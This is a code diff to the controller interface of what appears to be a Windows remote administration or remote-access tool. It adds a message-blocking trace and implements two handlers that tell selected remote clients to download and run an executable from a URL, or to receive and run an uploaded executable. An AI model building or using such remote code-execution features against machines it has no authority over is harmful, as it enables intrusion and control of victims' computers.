@@ -419,6 +419,7 @@ CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::I
     m_tinyDLL = NULL;
     auto dlls = ReadAllDllFilesWindows(GetParentDir() + "\\Plugins");
     m_DllList.insert(m_DllList.end(), dlls.begin(), dlls.end());
+    m_TraceTime= THIS_CFG.GetInt("settings", "TraceTime", 1000);
 }
 
 
@@ -774,7 +775,7 @@ VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName
         }
         if (ctx->GetClientID() == id) {
             LeaveCriticalSection(&m_cs);
-            Mprintf("上线消息 - 主机已经存在 [2]: same client ID. IP= %s\n", data[ONLINELIST_IP]);
+            Mprintf("上线消息 - 主机已经存在 [2]: %llu. IP= %s. Path= %s\n", id, data[ONLINELIST_IP], path);
             return;
         }
     }
@@ -2836,6 +2837,25 @@ BOOL CMy2015RemoteDlg::PreTranslateMessage(MSG* pMsg)
     return CDialogEx::PreTranslateMessage(pMsg);
 }
 
+LRESULT CMy2015RemoteDlg::WindowProc(UINT message, WPARAM wParam, LPARAM lParam) {
+    auto start = std::chrono::steady_clock::now();
+
+    LRESULT result = CDialogEx::WindowProc(message, wParam, lParam);
+
+    auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(
+        std::chrono::steady_clock::now() - start).count();
+
+    if (ms > m_TraceTime) {
+        if (message >= WM_USER) {
+            Mprintf("[BLOCKED] WM_USER + %d 阻塞: %lld ms\n", message - WM_USER, ms);
+        }
+        else {
+            Mprintf("[BLOCKED] MSG 0x%04X (%d) 阻塞: %lld ms\n", message, message, ms);
+        }
+    }
+
+    return result;
+}
 
 void CMy2015RemoteDlg::OnOnlineShare()
 {
@@ -3875,13 +3895,67 @@ void CMy2015RemoteDlg::OnMachineReboot()
 
 void CMy2015RemoteDlg::OnExecuteDownload()
 {
-    TODO_NOTICE;
-}
+    CInputDialog dlg(this);
+    dlg.Init("下载执行", "远程下载地址:");
+    dlg.m_str = "https://127.0.0.1/example.exe";
 
+    if (dlg.DoModal() != IDOK || dlg.m_str.IsEmpty())
+        return;
+
+    CString strUrl = dlg.m_str;
+    int nUrlLen = strUrl.GetLength();
+
+    int nPacketSize = 1 + nUrlLen + 1;
+    BYTE* pPacket = new BYTE[nPacketSize];
+
+    pPacket[0] = COMMAND_DOWN_EXEC;
+    memcpy(pPacket + 1, strUrl.GetBuffer(), nUrlLen);
+    pPacket[1 + nUrlLen] = '\0';
+
+    SendSelectedCommand(pPacket, nPacketSize);
+
+    delete[] pPacket;
+}
 
 void CMy2015RemoteDlg::OnExecuteUpload()
 {
-    TODO_NOTICE;
+    CFileDialog dlg(TRUE, NULL, NULL, OFN_HIDEREADONLY | OFN_FILEMUSTEXIST,
+        _T("可执行文件 (*.exe)|*.exe||"), this);
+
+    if (dlg.DoModal() != IDOK)
+        return;
+
+    CString strFilePath = dlg.GetPathName();
+    CFile file;
+
+    if (!file.Open(strFilePath, CFile::modeRead | CFile::typeBinary)) {
+        MessageBox("无法读取文件!\r\n" + strFilePath, "错误", MB_ICONERROR);
+        return;
+    }
+
+    DWORD dwFileSize = (DWORD)file.GetLength();
+    if (dwFileSize == 0 || dwFileSize > 12 * 1024 * 1024) {
+        MessageBox("文件为空或超过12MB，无法使用此功能!", "提示", MB_ICONWARNING);
+        file.Close();
+        return;
+    }
+
+    BYTE* pFileData = new BYTE[dwFileSize];
+    file.Read(pFileData, dwFileSize);
+    file.Close();
+
+    // 命令+大小+内容
+    int nPacketSize = 1 + 4 + dwFileSize;
+    BYTE* pPacket = new BYTE[nPacketSize];
+
+    pPacket[0] = COMMAND_UPLOAD_EXEC;
+    memcpy(pPacket + 1, &dwFileSize, 4);
+    memcpy(pPacket + 1 + 4, pFileData, dwFileSize);
+
+    SendSelectedCommand(pPacket, nPacketSize);
+
+    delete[] pFileData;
+    delete[] pPacket;
 }
 
 
